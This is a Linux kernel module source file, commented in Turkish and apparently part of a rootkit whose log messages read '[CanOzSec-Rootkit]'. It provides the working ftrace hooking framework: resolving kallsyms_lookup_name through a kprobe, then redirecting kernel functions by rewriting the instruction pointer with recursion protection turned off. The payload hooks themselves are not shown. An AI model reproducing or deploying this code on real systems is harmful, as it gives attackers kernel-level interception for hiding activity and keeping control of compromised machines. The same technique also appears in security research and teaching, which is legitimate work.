#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>


// Eger linux cekirdegi versiyonu 5.7.0 dan buyukse kallsyms_lookup_name() 
// exportlanmadigi icin kprobe kullanarak sembol adresini aliriz.
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};
#endif

// Hook islemini kolaylastirmak icin macro
#define HOOK(_name, _hook, _original)	\
{										\
	.name = (_name),					\
	.function = (_hook),				\
	.original = (_original),			\
}

// Hook islemini yaparken sonsuz loop olmamasi icin ftracein yapmasi gereken
// eylemi belirler. Normalde ftracein bunun icin korumalari vardir ancak rip
// registerini degistirmek istersek buna ftrace izin vermeyecektir bunun onune
// gecmek icin kendi korunma onlemlerimizi implemente etmemiz gerekir. 
// 1 -> ftracein cagridan atlamasi icin.
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Hook icin ihtiyac olan butun degerleri kaydettigimiz yapi:
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

// Orijinal sistem cagrisinin adresini bulmak icin kullandigimiz fonksiyon:
static int hh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "[CanOzSec-Rootkit]: sembol bulunamadi: %s\n", hook->name);
        return -ENOENT;
    }
// eger USE_FENTRY_OFFSET 1 ise ftracein cagridan atlamasi icin MCOUNT_INSN_SIZE ekleriz.
#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

// Ftrace cagrisinin bilgilerini tutmak icin cagrilan fonksiyon:
static void notrace hh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

// Hookun ops alanini ayarlayarak ve ardindan ftrace_set_filter_ip ve register_ftrace_function
// fonksiyonlarini kullanarak hooku koyabiliriz.
int hh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = hh_resolve_hook_address(hook);
    if(err)
        return err;
    // Ftrace'e rip registerini degistirebilecegimizi soylemek icin ve
    // ftracein kendi guvenlik ozelligini bu yuzden devre disi birakmak icin,
    // RECURSION_SAFE default deger olarak 1 i aliyor burada OR islemiyle 0 haline getiriyoruz.
    hook->ops.func = hh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "[CanOzSec-Rootkit]: ftrace_set_filter_ip() hatasi: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "[CanOzSec-Rootkit]: register_ftrace_function() hatasi: %d\n", err);
        return err;
    }

    return 0;
}


// Hook kaldirmak icin fonksiyon:
// Sirasiyla unregister_ftrace_function, ftrace_set_filter_ip 
// cagrilarini olusturmak icin yaptiklarimizi ters sirayla yapar.
void hh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "[CanOzSec-Rootkit]: unregister_ftrace_function() hatasi: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "[CanOzSec-Rootkit]: ftrace_set_filter_ip() hatasi: %d\n", err);
    }
}


// Birden fazla hooku eklemek icin fonksiyon:
int hh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = hh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        hh_remove_hook(&hooks[--i]);
    }
    return err;
}


// Birden fazla hooku kaldirmak icin fonksiyon:
void hh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        hh_remove_hook(&hooks[i]);
}